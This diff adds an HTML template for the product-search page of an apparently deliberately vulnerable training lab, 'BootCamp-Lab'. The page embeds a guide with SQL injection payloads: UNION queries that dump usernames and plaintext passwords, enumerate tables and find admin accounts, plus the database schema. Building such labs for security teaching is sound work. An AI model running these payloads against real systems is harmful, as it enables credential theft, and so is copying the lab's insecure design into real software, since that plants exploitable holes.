@@ -1,0 +1,120 @@
+{% extends "base.html" %}
+
+{% block title %}Search - BootCamp-Lab{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card mb-4">
+            <div class="card-header">
+                <h3 class="mb-0"><i class="fas fa-search"></i> Product Search</h3>
+            </div>
+            <div class="card-body">
+                <!-- Vulnerability Hints -->
+                <div class="alert alert-danger">
+                    <h6><i class="fas fa-skull-crossbones"></i> SQL Injection Playground:</h6>
+                    <ul class="mb-0 small">
+                        <li><strong>Basic SQLi:</strong> <code>laptop' OR '1'='1' --</code></li>
+                        <li><strong>UNION Attack:</strong> <code>x' UNION SELECT 1,username,password,4,5 FROM users--</code></li>
+                        <li><strong>Table Enumeration:</strong> <code>x' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'--</code></li>
+                        <li><strong>Extract All Users:</strong> <code>' UNION SELECT id,username,password,email,role FROM users--</code></li>
+                    </ul>
+                </div>
+
+                <form method="GET" action="{{ url_for('search') }}" class="mb-4">
+                    <div class="input-group input-group-lg">
+                        <input type="text" class="form-control" name="q" value="{{ query }}" placeholder="Search for products... or inject SQL 😈">
+                        <button class="btn btn-gradient" type="submit">
+                            <i class="fas fa-search"></i> Search
+                        </button>
+                    </div>
+                </form>
+
+                {% if query %}
+                <h5>Search Results for: <span class="text-primary">{{ query }}</span></h5>
+                <hr>
+                
+                {% if results %}
+                <div class="table-responsive">
+                    <table class="table table-striped">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Column 2</th>
+                                <th>Column 3</th>
+                                <th>Column 4</th>
+                                <th>Column 5</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for row in results %}
+                            <tr>
+                                {% for cell in row %}
+                                <td>{{ cell }}</td>
+                                {% endfor %}
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                <p class="text-muted">Found {{ results|length }} result(s)</p>
+                {% else %}
+                <div class="alert alert-warning">
+                    <i class="fas fa-exclamation-triangle"></i> No results found for "{{ query }}"
+                </div>
+                {% endif %}
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- SQL Injection Guide -->
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h5 class="mb-0"><i class="fas fa-book"></i> SQL Injection Guide</h5>
+            </div>
+            <div class="card-body">
+                <h6>Database Structure (for your convenience 😉):</h6>
+                <pre class="bg-light p-3">
+<strong>users</strong> table:
+  - id (INTEGER)
+  - username (VARCHAR)
+  - email (VARCHAR)
+  - password (VARCHAR) <- Plain text!
+  - role (VARCHAR)
+
+<strong>products</strong> table:
+  - id (INTEGER)
+  - name (VARCHAR)
+  - description (TEXT)
+  - price (FLOAT)
+  - stock (INTEGER)
+
+<strong>activity_logs</strong> table:
+  - id (INTEGER)
+  - user_id (INTEGER)
+  - action (VARCHAR)
+  - ip_address (VARCHAR)
+  - user_agent (VARCHAR)
+  - timestamp (DATETIME)
+                </pre>
+                
+                <h6 class="mt-3">Example Payloads:</h6>
+                <div class="list-group">
+                    <div class="list-group-item">
+                        <strong>Extract usernames and passwords:</strong><br>
+                        <code>' UNION SELECT id,username,password,email,role FROM users--</code>
+                    </div>
+                    <div class="list-group-item">
+                        <strong>Find admin user:</strong><br>
+                        <code>' UNION SELECT id,username,password,email,role FROM users WHERE role='admin'--</code>
+                    </div>
+                    <div class="list-group-item">
+                        <strong>Count users:</strong><br>
+                        <code>' UNION SELECT COUNT(*),NULL,NULL,NULL,NULL FROM users--</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
